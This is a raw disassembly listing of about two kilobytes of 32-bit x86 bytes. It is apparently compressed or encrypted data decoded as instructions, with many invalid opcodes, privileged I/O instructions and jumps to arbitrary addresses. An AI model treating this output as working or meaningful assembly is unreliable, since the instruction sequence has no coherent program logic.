  4360e4:	in     al,dx
  4360e5:	and    al,0x4b
  4360e7:	in     eax,0x8b
  4360e9:	fisttp DWORD PTR [eax]
  4360eb:	dec    edx
  4360ec:	push   eax
  4360ed:	xor    al,0x3d
  4360ef:	or     eax,0x4d7b8c00
  4360f4:	clc    
  4360f5:	add    eax,0x97331841
  4360fa:	mov    bl,0xef
  4360fc:	(bad)  
  4360fd:	pop    ebx
  4360fe:	lods   al,BYTE PTR ds:[esi]
  4360ff:	stc    
  436100:	dec    DWORD PTR [ecx+esi*2+0x3f]
  436104:	adc    BYTE PTR [eax],al
  436106:	add    BYTE PTR [eax],al
  436108:	add    BYTE PTR [eax],al
  43610a:	dec    esp
  43610b:	lods   al,BYTE PTR ds:[esi]
  43610c:	stc    
  43610d:	(bad)  
  43610e:	call   0x4d41dbf9
  436113:	cmc    
  436114:	sbb    DWORD PTR [ebx+0xf0073f1],eax
  43611a:	enter  0x748,0x0
  43611e:	sbb    al,0xf9
  436120:	lods   eax,DWORD PTR ds:[esi]
  436121:	add    ah,BYTE PTR [ebx]
  436123:	cmp    edi,esp
  436125:	mov    eax,DWORD PTR [edx-0x70bd1f2d]
  43612b:	ror    DWORD PTR [eax],0x89
  43612e:	dec    ecx
  43612f:	outs   dx,BYTE PTR ds:[esi]
  436130:	sti    
  436131:	xlat   BYTE PTR ds:[ebx]
  436132:	jne    0x43614c
  436134:	mov    bh,0x10
  436136:	xchg   DWORD PTR [ebx-0x76],ebx
  436139:	inc    ecx
  43613a:	push   ebp
  43613b:	xor    dl,BYTE PTR [esi+0x40]
  43613e:	clc    
  43613f:	pop    ecx
  436140:	sub    ebp,edi
  436142:	std    
  436143:	adc    DWORD PTR [eax],edx
  436145:	icebp  
  436146:	cmp    cl,cl
  436148:	std    
  436149:	std    
  43614a:	ficomp DWORD PTR [ecx-0x1102e5d7]
  436150:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436151:	mov    edi,0xfe2ba1de
  436156:	icebp  
  436157:	push   cs
  436158:	test   al,0x88
  43615a:	sbb    BYTE PTR [esi+0xa8d518a],dl
  436160:	push   edx
  436161:	call   0x412f2e
  436166:	out    dx,al
  436167:	push   ss
  436168:	mov    esp,0xf1013287
  43616d:	aam    0x0
  43616f:	add    BYTE PTR [eax],al
  436171:	add    BYTE PTR [eax],al
  436173:	inc    esi
  436174:	push   ebx
  436175:	stos   BYTE PTR es:[edi],al
  436176:	or     bh,dh
  436178:	pop    esp
  436179:	fld    QWORD PTR [edx-0x3f012a4b]
  43617f:	xor    eax,0x75fffdc9
  436184:	cdq    
  436185:	mov    esi,0xfd997001
  43618a:	jmp    FWORD PTR [edx+0x64]
  43618d:	or     eax,0xfd997100
  436192:	or     cl,bh
  436194:	xor    edi,ebp
  436196:	push   DWORD PTR [ebp+0x20]
  436199:	ds inc eax
  43619b:	out    dx,al
  43619c:	lea    esi,[ecx-0x4524f79]
  4361a2:	mov    esi,0xbf8aa6ab
  4361a7:	cld    
  4361a8:	gs test eax,0x79cc3583
  4361ae:	ins    DWORD PTR es:[edi],dx
  4361af:	jne    0x4361b3
  4361b1:	out    0x3,eax
  4361b3:	clc    
  4361b4:	cmp    al,BYTE PTR [edi]
  4361b6:	jg     0x4361ea
  4361b8:	adc    DWORD PTR ss:[ebp+0x476012ba],ecx
  4361bf:	and    DWORD PTR [ebp+0x77a930b0],eax
  4361c5:	adc    ah,ah
  4361c7:	icebp  
  4361c8:	aaa    
  4361c9:	fucomi st,st(4)
  4361cb:	sub    eax,0x7d565e42
  4361d0:	jns    0x436206
  4361d2:	mov    al,ds:0xcddec2d0
  4361d7:	add    BYTE PTR [eax],al
  4361d9:	add    BYTE PTR [eax],al
  4361db:	add    BYTE PTR [edi+0x5],al
  4361de:	mov    esi,0xa576d94e
  4361e3:	lea    esp,[esi]
  4361e5:	stos   BYTE PTR es:[edi],al
  4361e6:	pop    ss
  4361e7:	lea    esi,[esi]
  4361e9:	(bad)  
  4361ea:	out    0x3e,al
  4361ec:	xchg   ecx,eax
  4361ed:	dec    edi
  4361ee:	pop    ss
  4361ef:	lods   al,BYTE PTR ds:[esi]
  4361f0:	jmp    0x4361cd
  4361f2:	out    0x3,al
  4361f4:	lock inc esp
  4361f6:	pop    ebx
  4361f7:	lea    esp,[esi]
  4361f9:	stos   BYTE PTR es:[edi],al
  4361fa:	data16 sar BYTE PTR [ecx-0x4d],0xaa
  4361ff:	adc    esi,DWORD PTR [ebp+0x0]
  436202:	out    0x3,eax
  436204:	add    DWORD PTR [eax],ecx
  436206:	outs   dx,BYTE PTR ds:[esi]
  436207:	dec    edi
  436208:	imul   edi,DWORD PTR [esi-0x5c],0xcf39f0bb
  43620f:	push   ebp
  436210:	lds    edx,FWORD PTR [ebx+0x3f]
  436213:	icebp  
  436214:	xchg   BYTE PTR [edx],al
  436216:	out    0x8c,eax
  436218:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436219:	stos   BYTE PTR es:[edi],al
  43621a:	jo     0x43625d
  43621c:	ins    DWORD PTR es:[edi],dx
  43621d:	jge    0x4361cb
  43621f:	scas   eax,DWORD PTR es:[edi]
  436220:	call   0xa9dc:0x25050b3f
  436227:	inc    ebx
  436228:	cli    
  436229:	dec    edi
  43622a:	inc    DWORD PTR [esp+ebp*4+0x6de90042]
  436231:	test   DWORD PTR [edi+ebx*8+0x76],edx
  436235:	add    al,cl
  436237:	cs mov ecx,0x76e90002
  43623d:	ret    
  43623e:	add    edi,ebp
  436240:	add    BYTE PTR [eax],al
  436242:	add    BYTE PTR [eax],al
  436244:	add    BYTE PTR [esi+0x2],dh
  436247:	add    dh,dl
  436249:	mov    ch,0x12
  43624b:	add    cl,dh
  43624d:	jbe    0x436251
  43624f:	or     DWORD PTR [ebp-0xb],esp
  436252:	add    al,BYTE PTR [eax]
  436254:	jmp    0xea3f9052
  436259:	ins    DWORD PTR es:[edi],dx
  43625a:	jle    0x43628c
  43625c:	div    DWORD PTR [esi+0x2]
  43625f:	sub    eax,0x41f3a9
  436264:	out    0x44,al
  436266:	test   BYTE PTR [edi],0x29
  436269:	out    dx,al
  43626a:	inc    ebp
  43626b:	hlt    
  43626c:	jb     0x4362a3
  43626e:	loop   0x4361f6
  436270:	sub    al,0xd5
  436272:	test   eax,eax
  436274:	std    
  436275:	xchg   edi,eax
  436276:	jle    0x4362c0
  436278:	int    0xef
  43627a:	cmp    eax,0x2ebf6cd4
  43627f:	adc    DWORD PTR [edx+0x3d],esi
  436282:	inc    edx
  436283:	xor    eax,0x91696a1
  436288:	bound  ebp,QWORD PTR [ebx]
  43628a:	into   
  43628b:	xchg   BYTE PTR [edx+edx*1+0x2df3047a],ch
  436292:	inc    ebx
  436293:	inc    eax
  436294:	bound  esi,QWORD PTR [ebx-0x5538256]
  43629a:	add    DWORD PTR [ecx+esi*8+0x1],esi
  43629e:	inc    ebp
  43629f:	hlt    
  4362a0:	loop   0x43622d
  4362a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4362a3:	outs   dx,BYTE PTR ds:[esi]
  4362a4:	push   esi
  4362a5:	add    eax,0xe91043
  4362aa:	add    BYTE PTR [eax],al
  4362ac:	add    BYTE PTR [eax],al
  4362ae:	jo     0x4362b2
  4362b0:	add    BYTE PTR [eax],al
  4362b2:	mov    al,0x12
  4362b4:	or     DWORD PTR [ebp+0x20],0x7d
  4362b8:	dec    ebp
  4362b9:	clc    
  4362ba:	xchg   edi,eax
  4362bb:	inc    edx
  4362bc:	sbb    BYTE PTR [ecx-0x2],dl
  4362bf:	push   esp
  4362c0:	call   0x48725a
  4362c5:	mov    eax,DWORD PTR [ecx+0x66]
  4362c8:	add    DWORD PTR [edi+0x4],0x75f43d7c
  4362cf:	inc    ebx
  4362d0:	cld    
  4362d1:	add    ecx,DWORD PTR [eax*4+0x75dce475]
  4362d8:	dec    ebp
  4362d9:	clc    
  4362da:	fild   DWORD PTR [ecx+0x4cc0dad]
  4362e0:	jecxz  0x4362f0
  4362e2:	inc    edi
  4362e3:	jmp    0xf25fe807
  4362e8:	inc    dh
  4362ea:	mov    WORD PTR [edx],cs
  4362ec:	add    BYTE PTR [eax],al
  4362ee:	int3   
  4362ef:	add    al,0xbf
  4362f1:	inc    edi
  4362f2:	pop    esp
  4362f3:	(bad)  
  4362f4:	(bad)  
  4362f5:	call   FWORD PTR [edi+eiz*2+0x48c06ff]
  4362fc:	add    bh,dh
  4362fe:	push   ebx
  4362ff:	push   cs
  436300:	add    BYTE PTR [eax],dl
  436302:	pushf  
  436303:	add    al,0x7
  436305:	test   BYTE PTR [esi+edi*8],al
  436308:	(bad)  
  436309:	dec    DWORD PTR [edi]
  43630b:	jmp    0x436308
  43630d:	add    BYTE PTR [ebx+0xd7928],bl
  436313:	add    BYTE PTR [eax],al
  436315:	add    BYTE PTR [eax],al
  436317:	pop    esp
  436318:	add    al,0x2b
  43631a:	rcr    cl,0xe2
  43631d:	and    eax,DWORD PTR [eax]
  43631f:	pop    ebx
  436320:	push   ss
  436321:	or     al,0x10
  436323:	or     al,0x77
  436325:	cmp    eax,0x1fe7c7f4
  43632a:	mov    DWORD PTR [ecx],ebx
  43632c:	mov    BYTE PTR [ebp-0x40],bh
  43632f:	jne    0x4362b6
  436331:	in     al,0x84
  436333:	lods   eax,DWORD PTR ds:[esi]
  436334:	mov    ebp,0x17494b8c
  436339:	retf   
  43633a:	je     0x4362be
  43633c:	xor    al,0x41
  43633e:	inc    eax
  43633f:	pop    esi
  436340:	popa   
  436341:	in     eax,0x6c
  436343:	push   0x24
  436345:	dec    edi
  436346:	aam    0xff
  436348:	(bad)  
  436349:	lahf   
  43634a:	mov    BYTE PTR [ecx-0x4d],dh
  43634d:	mov    dl,0x41
  43634f:	mov    ch,0x24
  436351:	push   eax
  436352:	clc    
  436353:	div    BYTE PTR [esi]
  436355:	mov    al,ds:0x86b16900
  43635a:	inc    ebx
  43635b:	loope  0x436361
  43635d:	aas    
  43635e:	cld    
  43635f:	xor    BYTE PTR [bp+si-0x7abf],ch
  436364:	cdq    
  436365:	(bad)  
  436366:	push   DWORD PTR [ebp+0x5]
  436369:	or     DWORD PTR [ebp+0x53868d38],eax
  43636f:	mov    ebp,0x24183a24
  436374:	jmp    0x4363c9
  436376:	call   0x412f13
  43637b:	add    BYTE PTR [eax],al
  43637d:	add    BYTE PTR [eax],al
  43637f:	add    dh,bh
  436381:	push   cs
  436382:	mov    esp,0x86d13a87
  436387:	inc    ebx
  436388:	mov    eax,ds:0x76fc40c2
  43638d:	jmp    0x99d4df0f
  436392:	mov    WORD PTR [ebx+0x7d],ss
  436395:	mov    al,ds:0x99680380
  43639a:	std    
  43639b:	in     al,0x83
  43639d:	xor    al,0x3a
  43639f:	and    al,dh
  4363a1:	fsubr  DWORD PTR [eax]
  4363a3:	add    DWORD PTR [edx],edi
  4363a5:	pop    ecx
  4363a6:	fcos   
  4363a8:	pop    edx
  4363a9:	cdq    
  4363aa:	std    
  4363ab:	sar    BYTE PTR [edx+0x2],0xef
  4363af:	add    esi,DWORD PTR [ebp+0x2]
  4363b2:	adc    bh,BYTE PTR [esi]
  4363b4:	gs add ah,ch
  4363b7:	add    esi,DWORD PTR [ebp+0x2e]
  4363ba:	int3   
  4363bb:	sub    BYTE PTR [edi],0x12
  4363be:	jbe    0x4363ab
  4363c0:	dec    DWORD PTR [edx+0x27503e7]
  4363c6:	data16 cmp BYTE PTR [ecx],bl
  4363c9:	add    bl,dl
  4363cb:	jg     0x43640f
  4363cd:	mul    dh
  4363cf:	add    edi,DWORD PTR [eax+esi*2-0x1b]
  4363d3:	mov    ah,0xae
  4363d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4363d6:	pop    esi
  4363d7:	(bad)  
  4363d8:	sub    BYTE PTR [edx-0x6487edb],ah
  4363de:	outs   dx,DWORD PTR ds:[esi]
  4363df:	dec    edi
  4363e0:	in     eax,dx
  4363e1:	add    bl,BYTE PTR [edi+0x81]
  4363e7:	add    BYTE PTR [eax],al
  4363e9:	fist   WORD PTR [ecx]
  4363eb:	xor    eax,0x1a6f6cd6
  4363f0:	sbb    al,0x88
  4363f2:	leave  
  4363f3:	bnd jle 0x4363b6
  4363f6:	stos   BYTE PTR es:[edi],al
  4363f7:	call   0xf0ad:0xd6cb90b5
  4363fe:	ds (bad) 
  436400:	jle    0x4363b7
  436402:	sub    eax,0x123c88d9
  436407:	test   al,0xbb
  436409:	jp     0x43638e
  43640b:	mov    BYTE PTR [ebx],al
  43640d:	repnz cmp DWORD PTR [ebx+0x29e22488],edi
  436414:	inc    edx
  436415:	inc    ebp
  436416:	add    edi,esp
  436418:	add    esi,DWORD PTR [ebp+0x1c]
  43641b:	out    0x29,eax
  43641d:	jne    0x43643b
  43641f:	out    0xab,eax
  436421:	mov    bh,0x10
  436423:	out    0x3,eax
  436425:	lock aaa 
  436427:	out    dx,eax
  436428:	mov    dh,al
  43642a:	stos   BYTE PTR es:[edi],al
  43642b:	add    BYTE PTR [eax-0x68],ah
  43642e:	or     al,BYTE PTR [edi+0x1c346a8]
  436434:	bnd jbe 0x436439
  436437:	add    BYTE PTR [eax],dl
  436439:	ins    DWORD PTR es:[edi],dx
  43643a:	idiv   bh
  43643c:	call   0x9a640d36
  436441:	adc    al,0x27
  436443:	jnp    0x43644a
  436445:	jno    0x436442
  436447:	and    DWORD PTR [edx-0x19fffd86],0x0
  43644e:	add    BYTE PTR [eax],al
  436450:	add    BYTE PTR [eax],al
  436452:	mov    BYTE PTR [edx+edi*8-0x35803564],ah
  436459:	mov    edx,0xa77ce4d6
  43645e:	outs   dx,BYTE PTR ds:[esi]
  43645f:	jge    0x4364b4
  436461:	shl    DWORD PTR [ebp-0x36],1
  436464:	jge    0x436435
  436466:	(bad)  
  436467:	pop    ss
  436468:	fidiv  DWORD PTR [edx-0x43]
  43646b:	jg     0x43642a
  43646d:	test   al,0x16
  43646f:	adc    edi,DWORD PTR [edi-0x38]
  436472:	jbe    0x43641f
  436474:	add    cl,ch
  436476:	jne    0x436432
  436478:	test   DWORD PTR [edx-0x57f76549],ebp
  43647e:	pop    ss
  43647f:	sti    
  436480:	and    ch,cl
  436482:	add    DWORD PTR [ebx],eax
  436484:	add    dl,ch
  436486:	mov    bh,0x7f
  436488:	dec    ebx
  436489:	icebp  
  43648a:	mov    bh,0x9f
  43648c:	sbb    dl,ch
  43648e:	mov    ch,0x7d
  436490:	inc    ecx
  436491:	shr    edi,1
  436493:	in     eax,0x2f
  436495:	mov    edx,0x2ef1d7ad
  43649a:	mov    edi,edi
  43649c:	(bad)  
  43649d:	call   0xe5bc8c18
  4364a2:	jbe    0x43649f
  4364a4:	or     DWORD PTR [edi+0x27d],0x46
  4364ab:	add    DWORD PTR [edx+0x0],esp
  4364ae:	inc    esi
  4364af:	add    eax,ebp
  4364b1:	lods   eax,DWORD PTR ds:[esi]
  4364b2:	jne    0x4364b2
  4364b4:	dec    DWORD PTR [edx+0x0]
  4364ba:	add    cl,ch
  4364bc:	clc    
  4364bd:	add    BYTE PTR [edi+0x74],0x79
  4364c1:	cmp    dh,BYTE PTR [eax]
  4364c3:	(bad)  
  4364c4:	xor    al,0xf8
  4364c6:	(bad)  
  4364c7:	dec    ebx
  4364c8:	cli    
  4364c9:	(bad)  
  4364ca:	call   FWORD PTR [edx+eax*4]
  4364cd:	jne    0x4364db
  4364cf:	sbb    esi,edi
  4364d1:	sbb    esp,0x27
  4364d4:	add    DWORD PTR [eax],eax
  4364d6:	and    DWORD PTR [ecx-0x67f10203],0xffffffd3
  4364dd:	add    eax,DWORD PTR [eax]
  4364df:	sbb    al,0x7c
  4364e1:	ja     0x4364e7
  4364e3:	or     al,0xed
  4364e5:	adc    ecx,DWORD PTR [ebx+0x7d97cd2]
  4364eb:	das    
  4364ec:	test   DWORD PTR [ebx],esp
  4364ee:	icebp  
  4364ef:	sbb    edi,ecx
  4364f1:	adc    DWORD PTR [eax],eax
  4364f3:	int3   
  4364f4:	add    cl,ah
  4364f6:	pop    edx
  4364f7:	xlat   BYTE PTR ds:[ebx]
  4364f8:	add    BYTE PTR [eax],al
  4364fa:	and    DWORD PTR [edx],0xfffffffd
  4364fd:	push   0x2a
  4364ff:	out    0xf7,eax
  436501:	test   BYTE PTR [ebx+0xcc],bl
  436507:	dec    edi
  436508:	repz sti 
  43650a:	add    bl,dl
  43650c:	jl     0x4364a7
  43650e:	or     ebx,DWORD PTR [eax+eax*1+0x6f8eb607]
  436515:	inc    ebp
  436516:	cld    
  436517:	pop    ss
  436518:	ror    bl,0xe0
  43651b:	pop    esi
  43651c:	jge    0x4364dc
  43651e:	or     BYTE PTR [eax],al
  436520:	add    BYTE PTR [eax],al
  436522:	add    BYTE PTR [eax],al
  436524:	add    eax,0x3403f84b
  436529:	jge    0x436521
  43652b:	add    esi,DWORD PTR [ebp-0x37]
  43652e:	iret   
  43652f:	test   DWORD PTR [esi],edi
  436531:	jmp    0x4364cb
  436533:	test   DWORD PTR [esi],esi
  436535:	sbb    DWORD PTR [ebx+0x139f7ff],esp
  43653b:	xchg   DWORD PTR [edx+0x76f88295],ebp
  436541:	ins    BYTE PTR es:[edi],dx
  436542:	push   esi
  436543:	stc    
  436544:	xchg   ecx,eax
  436545:	push   ss
  436546:	mov    WORD PTR [ebx],?
  436548:	mov    dh,0x99
  43654a:	(bad)  
  43654b:	in     eax,0x77
  43654d:	aam    0x4
  43654f:	or     esi,DWORD PTR [ebp-0x67]
  436552:	std    
  436553:	jl     0x436570
  436555:	cdq    
  436556:	pushf  
  436557:	stc    
  436558:	outs   dx,DWORD PTR ds:[esi]
  436559:	cdq    
  43655a:	std    
  43655b:	test   BYTE PTR [edx],dh
  43655d:	add    bh,BYTE PTR [ecx-0xf]
  436560:	adc    dl,BYTE PTR [ebp-0x6c86847e]
  436566:	mov    BYTE PTR [ecx],0x66
  436569:	cdq    
  43656a:	std    
  43656b:	inc    DWORD PTR [eax+0x77e5c2fd]
  436571:	sbb    BYTE PTR [edi-0x7032203],bl
  436577:	jmp    edx
  436579:	pop    edx
  43657a:	call   0x7500:0xd94b3fe
  436581:	cdq    
  436582:	sub    dl,0x76
  436585:	xchg   edx,eax
  436586:	int    0x6
  436588:	add    BYTE PTR [eax],al
  43658a:	add    BYTE PTR [eax],al
  43658c:	add    BYTE PTR [ebp-0x67],dh
  43658f:	jp     0x4365d4
  436591:	ins    DWORD PTR es:[edi],dx
  436592:	push   esp
  436593:	cmp    eax,0x440b6218
  436598:	add    BYTE PTR [edx+0x75001094],dh
  43659e:	cdq    
  43659f:	(bad)  
  4365a0:	in     eax,0x77
  4365a2:	sbb    BYTE PTR [edi-0x5116203],bl
  4365a8:	dec    DWORD PTR [edx+0xc16e02]
  4365ae:	mov    eax,ds:0xcf8bdee2
  4365b3:	xchg   BYTE PTR ds:[edi-0x1e],ch
  4365b7:	aad    0xe5
  4365b9:	jmp    0x6c46a8e3
  4365be:	jle    0x4365fe
  4365c0:	std    
  4365c1:	pop    edx
  4365c2:	mov    ds:0xa45379e2,eax
  4365c7:	pushf  
  4365c8:	scas   eax,DWORD PTR es:[edi]
  4365c9:	lock mov bl,0x36
  4365cc:	mov    ds:0xfb217f83,eax
  4365d1:	repz dec esp
  4365d3:	clts   
  4365d5:	dec    ebp
  4365d6:	jg     0x4365e1
  4365d8:	jecxz  0x436572
  4365da:	les    ebp,FWORD PTR [esi-0x42]
  4365dd:	clc    
  4365de:	mov    esi,0xa356d3f2
  4365e3:	repnz add dh,BYTE PTR [ebp-0x3f]
  4365e7:	add    BYTE PTR [ebx],dl
  4365e9:	inc    eax
  4365ea:	shl    edx,0x86
  4365ed:	push   0xb1daa8
  4365f2:	add    BYTE PTR [eax],al
  4365f4:	add    BYTE PTR [eax],al
  4365f6:	dec    eax
  4365f7:	(bad)  
  4365f8:	push   ss
  4365f9:	mov    edx,0x9db2570
  4365fe:	repnz cmp ah,BYTE PTR [edi]
  436601:	leave  
  436602:	je     0x4365f8
  436604:	out    0x3,al
  436606:	jne    0x4365fb
  436608:	push   0x7a
  43660a:	jnp    0x43660e
  43660c:	out    0xc8,eax
  43660e:	je     0x436603
  436610:	out    0x3,al
  436612:	jne    0x43668b
  436614:	and    al,BYTE PTR [edx+esi*8+0x3c]
  436618:	fwait
  436619:	xchg   DWORD PTR [ebp+0x770c62f2],esi
  43661f:	add    ah,bh
  436621:	jl     0x436651
  436623:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436624:	mov    esi,0xfffd27c2
  436629:	popa   
  43662a:	mov    dh,0x7a
  43662c:	dec    ebx
  43662d:	jne    0x436637
  43662f:	aaa    
  436630:	lock and dh,BYTE PTR [esi-0x498dfcd1]
  436637:	jp     0x43667c
  436639:	pop    ebp
  43663a:	cli    
  43663b:	ret    0x6509
  43663e:	repz or BYTE PTR [eax],al
  436641:	jmp    0x7337b427
  436646:	ret    0x859a
  436649:	lods   al,BYTE PTR ds:[esi]
  43664a:	out    dx,al
  43664b:	push   ecx
  43664c:	dec    esi
  43664d:	cdq    
  43664e:	out    dx,al
  43664f:	je     0x436677
  436651:	jmp    0x1586edcc
  436656:	jbe    0x43669d
  436658:	clc    
  436659:	rol    BYTE PTR [eax],0x0
  43665c:	add    BYTE PTR [eax],al
  43665e:	add    BYTE PTR [ebx-0x195bd862],bh
  436664:	mov    eax,ds:0x35a01144
  436669:	clc    
  43666a:	push   0x2d
  43666c:	(bad)  
  43666e:	scas   al,BYTE PTR es:[edi]
  43666f:	mov    dh,0xa9
  436671:	repnz loopne 0x4366ea
  436674:	add    bh,BYTE PTR [ebp-0x19]
  436677:	je     0x4366a8
  436679:	and    ch,BYTE PTR [edx+edx*2-0x1a]
  43667d:	jmp    FWORD PTR [ecx-0x5d]
  436680:	sahf   
  436681:	add    dh,bl
  436683:	repnz loope 0x43668b
  436686:	jmp    0xebf57201
  43668b:	and    eax,0xb462fc4e
  436690:	iret   
  436691:	loopne 0x4366be
  436693:	lock les ecx,FWORD PTR [eax]
  436696:	jo     0x4366c3
  436698:	call   0x1b0a:0x9cf1c0fd
  43669f:	mov    DWORD PTR [edi-0x428953b],0x90700be
  4366a9:	jns    0x43666c
  4366ab:	lea    eax,[eax+eax*1]
  4366ae:	add    BYTE PTR [edi],dl
  4366b0:	mov    BYTE PTR [ecx-0x1c3a83b1],0x5
  4366b7:	pop    es
  4366b8:	pop    esi
  4366b9:	jnp    0x43669b
  4366bb:	jnp    0x436643
  4366bd:	(bad)  [edi]
  4366bf:	sbb    al,0x86
  4366c1:	mov    ecx,0x4
  4366c6:	add    BYTE PTR [eax],al
  4366c8:	popf   
  4366c9:	jle    0x4366cf
  4366cb:	or     edx,0x3
  4366ce:	jns    0x43674f
  4366d0:	sub    al,0xf3
  4366d2:	clc    
  4366d3:	call   FWORD PTR [esp+ebx*1+0x3f]
  4366d7:	fs aad 0x42
  4366da:	pop    esp
  4366db:	psrlq  mm6,QWORD PTR [ecx-0x79a4000e]
  4366e2:	clc    
  4366e3:	push   ds
  4366e4:	sbb    ecx,DWORD PTR [edx+0x527bf92b]
  4366ea:	mov    edi,0x50447
  4366ef:	add    BYTE PTR [edx+ecx*8],cl
  4366f2:	call   DWORD PTR [eax]
  4366f4:	sbb    al,0x5
  4366f6:	add    BYTE PTR [ebx+0x4f32fceb],cl
  4366fc:	mov    eax,0xfeb49d5
  436701:	add    BYTE PTR [ecx+0x0],0x5f
  436705:	jo     0x436702
  436707:	jb     0x436787
  436709:	test   DWORD PTR [ebp-0x4],esi
  43670c:	int3   
  43670d:	lahf   
  43670e:	jge    0x4366cc
  436710:	in     eax,0x4
  436712:	add    BYTE PTR [edi],cl
  436714:	push   edx
  436715:	add    al,0xf7
  436717:	dec    ebp
  436718:	sbb    BYTE PTR ds:0x43ecd3c6,bl
  43671e:	jnp    0x4366e6
  436720:	les    ebx,FWORD PTR ds:0xac75f84d
  436726:	lds    edi,FWORD PTR [ebp-0x55]
  436729:	stos   DWORD PTR es:[edi],eax
  43672a:	das    
  43672b:	fiadd  DWORD PTR [eax]
  43672d:	add    BYTE PTR [eax],al
  43672f:	add    BYTE PTR [eax],al
  436731:	out    dx,al
  436732:	out    dx,eax
  436733:	sbb    ecx,DWORD PTR [ecx]
  436735:	loop   0x4366dd
  436737:	dec    eax
  436738:	adc    BYTE PTR [edi-0x15],0x3
  43673c:	test   DWORD PTR [esi+0x1b01a32b],edi
  436742:	adc    al,BYTE PTR [eax+0x41]
  436745:	add    eax,0xfe684140
  43674a:	push   0xad5ebf15
  43674f:	jle    0x43673b
  436751:	jbe    0x436757
  436753:	cmp    DWORD PTR [edi+eiz*8+0x1c],ebx
  436757:	ins    BYTE PTR es:[edi],dx
  436758:	or     eax,0x36fda975
  43675d:	mov    dl,0xc1
  43675f:	cs sbb eax,0xa480b14e
  436765:	xchg   ecx,eax
  436766:	test   eax,0x2475fffd
  43676b:	push   ecx
  43676c:	push   0x5300387a
  436771:	cmc    
  436772:	retf   
  436773:	cmp    eax,0x21fb6600
  436778:	xchg   DWORD PTR [ecx-0x4d06d298],ebp
  43677e:	sub    esp,0xa23b8d40
  436784:	mov    esi,edx
  436786:	stc    
  436787:	push   es
  436788:	add    BYTE PTR [ebp+0x26],dh
  43678b:	cmp    ch,BYTE PTR [esp+edi*8-0x56]
  43678f:	jl     0x4367d2
  436791:	xor    DWORD PTR [esi],edx
  436793:	xchg   edx,eax
  436794:	lock add BYTE PTR [eax],al
  436797:	add    BYTE PTR [eax],al
  436799:	add    BYTE PTR [edi-0x57],dh
  43679c:	std    
  43679d:	dec    ebp
  43679e:	add    cl,dh
  4367a0:	push   edi
  4367a1:	push   eax
  4367a2:	and    al,0x68
  4367a4:	std    
  4367a5:	add    BYTE PTR [ebp+0x2],dh
  4367a8:	out    0x3,eax
  4367aa:	push   ebx
  4367ab:	repz imul eax,DWORD PTR [esi+0x25],0x32
  4367b0:	std    
  4367b1:	add    ebx,DWORD PTR [ebp+0x7503d539]
  4367b7:	mov    ebx,DWORD PTR [esp+ebp*4]
  4367ba:	sbb    dh,al
  4367bc:	fistp  QWORD PTR [esi+esi*1-0x46]
  4367c0:	ins    BYTE PTR es:[edi],dx
  4367c1:	ret    
  4367c2:	jl     0x436749
  4367c4:	inc    esp
  4367c5:	sti    
  4367c6:	sbb    BYTE PTR [edi-0x38f2b990],0xe2
  4367cd:	adc    DWORD PTR [ebp+0x2],esi
  4367d0:	out    0x7a,eax
  4367d2:	mov    ah,0x26
  4367d4:	out    0x46,al
  4367d6:	aad    0xd9
  4367d8:	test   eax,0x46836c1b
  4367dd:	add    al,0x75
  4367df:	add    bl,BYTE PTR [esi+0x3e]
  4367e2:	mov    eax,ds:0x7503e85a
  4367e7:	add    dh,BYTE PTR [esi]
  4367e9:	mov    ds:0x3bab4ef0,eax
  4367ee:	nop
  4367ef:	ret    
  4367f0:	pop    esi
  4367f1:	jmp    FWORD PTR [ebx+0xdc4288b]
  4367f7:	or     dh,dl
  4367f9:	jne    0x436830
  4367fb:	mov    DWORD PTR [edi+esi*4+0x0],ebp
  436802:	add    BYTE PTR [eax-0x38],cl
  436805:	jns    0x4367f5
  436807:	mov    DWORD PTR ds:0x866c02eb,ebx
  43680d:	mov    dl,0xfc
  43680f:	cli    
  436810:	sahf   
  436811:	jmp    0xf0b0:0x249ff375
  436818:	iret   
  436819:	mov    dh,0xa4
  43681b:	clc    
  43681c:	dec    esi
  43681d:	sbb    eax,DWORD PTR [edx+0x58]
  436820:	enter  0xef,0xad
  436824:	pop    ecx
  436825:	add    al,ch
  436827:	jbe    0x43682b
  436829:	add    BYTE PTR [edx+0x35498519],bl
  43682f:	ds xor edi,eax
  436832:	xor    DWORD PTR [ebp+ebx*2-0x7b081a7b],edx
  436839:	mov    edi,0x90a01a8
  43683e:	aas    
  43683f:	mov    cl,0x86
  436841:	dec    ebx
  436842:	jne    0x4367e0
  436844:	shl    BYTE PTR [ecx-0x58],0xc
  436848:	pop    edi
  436849:	mov    edi,0x43876981
  43684e:	cmp    eax,0xf9f81d53
  436853:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436854:	hlt    
  436855:	mov    esi,0xb20b6940
  43685a:	and    BYTE PTR [eax+ebp*4+0x25],al
  43685e:	cmp    ah,bl
  436860:	dec    ebx
  436861:	push   0x4946cfc7
  436866:	mov    ecx,0x0
  43686b:	add    BYTE PTR [ecx],bl
  43686d:	inc    esp
  43686e:	push   0xf99d7c40
  436873:	jmp    0x28c893fb
  436878:	ss stos DWORD PTR es:[edi],eax
  43687a:	or     dh,ah
  43687c:	mov    al,ds:0x77297dc2
  436881:	xlat   BYTE PTR ds:[ebx]
  436882:	out    dx,eax
  436883:	jp     0x4368ab
  436885:	mov    DWORD PTR [ebp+0x276e9],edx
  43688b:	push   0x5a
  43688d:	sahf   
  43688e:	add    dh,bl
  436890:	cli    
  436891:	dec    ebp
  436892:	or     cl,ch
  436894:	jbe    0x4368a1
  436896:	mov    dl,0xeb
  436898:	and    DWORD PTR [edx-0x4],ecx
  43689b:	bound  ebp,QWORD PTR [eax]
  43689d:	shl    al,1
  43689f:	bound  esp,QWORD PTR [ebx+0x4f003e96]
  4368a5:	(bad)  
  4368a6:	or     BYTE PTR [ebx],al
  4368a8:	adc    al,0x9f
  4368aa:	scas   eax,DWORD PTR es:[edi]
  4368ab:	lds    ebx,FWORD PTR [edi-0x3f]
  4368ae:	cli    
  4368af:	mov    BYTE PTR [ecx+0x6e],ch
  4368b2:	xor    esi,eax
  4368b4:	pop    esi
  4368b5:	mov    ah,0x83
  4368b7:	inc    edi
  4368b8:	test   BYTE PTR [edi+0x7aefcdaf],bl
  4368be:	and    esi,ecx
  4368c0:	sbb    ecx,eax
  4368c2:	pop    es
